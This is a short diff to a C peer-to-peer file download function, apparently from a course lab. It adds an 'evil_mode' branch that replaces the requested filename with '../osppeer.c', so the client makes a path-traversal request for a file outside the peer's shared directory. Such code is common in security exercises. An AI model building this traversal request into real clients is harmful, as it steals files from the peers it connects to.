@@ -536,7 +536,17 @@ static void task_download(task_t *t, task_t *tracker_task)
         error("* Cannot connect to peer: %s\n", strerror(errno));
         goto try_again;
     }
+ 
+
+    // If evil_mode is active, it attempts to download a file it didn't request.   
+    if (evil_mode == 1)
+    {
+        sprintf(t->filename, "../osppeer.c");    
+    }
+
     osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+    
+    
 
     // Open disk file for the result.
     // If the filename already exists, save the file in a name like
